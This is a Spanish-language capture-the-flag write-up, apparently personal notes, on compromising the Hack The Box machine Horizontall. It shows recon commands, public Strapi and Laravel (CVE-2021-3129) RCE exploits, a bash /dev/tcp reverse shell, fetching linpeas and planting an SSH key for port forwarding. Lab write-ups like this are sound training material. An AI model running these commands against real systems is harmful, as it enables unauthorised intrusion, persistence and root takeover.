<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Horizontall</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Horizontall</h1><br/><p><ol><li>Hago un escaneo de puertos <strong>nmap -Pn -sV -sC -p- --open 10.10.11.105 -oN scan.txt</strong></li><li>Tiene problemas por lo que tengo que agregarlo a /etc/hosts</li><li>A primera vista veo un par de buttons pero nada interesante</li><li>Realizo un escaneo de direcotrios para ver si se encuentra algún login <strong> dirb </strong><strong><a href="http://horizontall.htb/">http://horizontall.htb/</a></strong></li><li>No encuentro nada interesante</li><li>Realizo un escaneo de vhosts con gobuster <strong>gobuster vhost -u </strong><strong><a href="http://horizontall.htb">http://horizontall.htb</a></strong><strong> -t 35 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain -k --no-error</strong></li><li>Me da muchos vhosts por lo que pruebo con otra herramienta</li><li>Pruebo con <strong>ffuf</strong> <strong>  sudo ffuf -u </strong><strong><a href="http://horizontall.htb/">http://horizontall.htb/</a></strong><strong> -H &quot;Host: FUZZ.horizontall.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194 </strong></li><li>Veo el código de la página web para ver si hay alguna redirección</li><li>Al no encontrar nada interesante miro en los .js</li><li>Meto este código em beautifier.io para que sea más cómodo para leer</li><li>Encuentro una redirección a otra página web</li></ol></p><p>  <img src="images/23-1.png" alt="images/23-1.png" /><ol><li>Lo añadimos a<strong> /etc/hosts</strong></li><li>Realizo un escaneo de directorios de esta dirección web<strong> dirb http://api-prod.horizontall.htb/</strong></li><li>Encuentro directorios importantes </li></ol><img src="images/23-2.png" alt="images/23-2.png" /><ol><li>Robots.txt y users no tienen nada relevante. Pero si accedo a admin me aparece un login</li><li>Pruebo con los típicos usernames y pass pero no da resultados</li><li>Voy a interceptar el POST con Burpsuite para ver si me devuelve algo interesante</li><li>No encuentro nada interesante</li><li>Si hago una enumeración de directorios dentro de <strong><a href="http://api-prod.horizontall.htb/admin/">http://api-prod.horizontall.htb/admin/</a></strong> a lo mejor encuetro algo interesante</li><li>Encuentro el directorio init</li><li>Dentro de ahí esta la versión de Strapi (Login)</li><li>Con <strong>searchsploit</strong> encuentro un <strong>RCE</strong></li></ol></p><p>  <img src="images/23-3.png" alt="images/23-3.png" /></p><p> <strong> python3 50239.py </strong><strong><a href="http://api-prod.horizontall.htb/">http://api-prod.horizontall.htb/</a></strong><ol><li>Recibo un blind shell gracias al RCE</li><li>Ahora me toca obtener un reverse shell <strong>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</strong></li><li>Pongo netcat en escucha</li></ol></p><p>  <img src="images/23-4.png" alt="images/23-4.png" /><ol><li>Tengo que meterlo dentro de un comando bash para que se ejecute bien si no me devolverá “Bad Request&quot;<strong> bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;</strong></li><li>Obtengo el reverse</li></ol></p><p>  <img src="images/23-5.png" alt="images/23-5.png" /><ol><li>Encuentro la flag de user.txt <strong>cat /home/developer/user.txt</strong></li><li>Pruebo a hacer sudo -l pero me pide la contraseña de strapi</li><li>Uso LinPeas para encontrar una posible escalada de privilegios</li><li>Para pasarlo monto el servidor local <strong>  python3 -m http.server &lt;PORT&gt;</strong></li><li>Me pongo en la carpeta<strong> /tmp</strong></li><li>Realizo un wget para coger el archivo<strong> linpeas.sh</strong><strong> wget </strong><strong><a href="http://10.10.14.2:4321/linpeas.sh">http://&lt;IP&gt;:&lt;PORT&gt;/linpeas.sh</a></strong></li><li>Le doy permiso de ejecución <strong>chmod +x linpeas.sh</strong></li><li>Pongo que se ejecute linpeas y que se metan los datos en el archivo linpeas.txt<strong> ./linpeas.sh &gt; linpeas.txt</strong></li><li>Cuando acabe hacemos un cat a linpeas.txt (Nos mostrará muchos datos)</li><li>Las áreas importantes aparecen marcadas en rojo</li><li>Encuentro este conjunto de puertos abiertos</li></ol></p><p>  <img src="images/23-6.png" alt="images/23-6.png" /><ol><li>Usando netstat veo que hay algo montado a nivel local<strong> netstat -pentul</strong></li></ol></p><p>  <img src="images/23-7.png" alt="images/23-7.png" /><ol><li>Hago un curl al puerto 8000  para ver de que se trata<strong> curl -sSL -D- </strong><strong><a href="http://localhost:8000">http://localhost:8000</a></strong><strong> -o /dev/null</strong></li><li>Parece ser una web llamada Laravel.</li><li>Por lo que en el puerto 8000 está montado un servidor web hosteado a nivel local</li><li>Tengo que hacer un portforwarding para poder ver está página en mi máquina</li><li>Para hacer el portforwarding voy a hacerlo a traves de SSH</li><li>Primero creo las ssh-keys y las metemos en un archivo<strong> ssh-keygen</strong></li><li>Accedo al directorio donde están las id_rsa y copio el contenido de id_rsa.pub en un archivo que llamare authorized_keys</li><li>Vuelvo a hacer un echo solo que en la máquina atacada con el contenido de id_rsa.pub y con el mismo nombre authorized_keys</li><li> Por un problema de donde pegué las keys no me dejaba entrar  por SSH (Lo pego en la ruta /opt/strapi)</li><li>Ahora puedo ver la web en mi navegador  </li></ol><img src="images/23-8.png" alt="images/23-8.png" /></p><p>  <img src="images/23-9.png" alt="images/23-9.png" /><ol><li>Si analizamos un poco la página podemos ver la versión del Laravel y la versión de PHP</li><li>Encuentro el <strong>CVE-2021-3129</strong></li><li>Descargo el archivo py</li><li>Lo ejecuto y compruebo si funciona <strong>python3 exploit.py http://localhost:8000 Monolog/RCE1 &quot;cat /root/root.txt&quot;</strong></li><li>Efectivamente el RCE me deja ejecutar comandos como usuario root</li></ol></p><p align="center"></p></div>
</body>
</html>
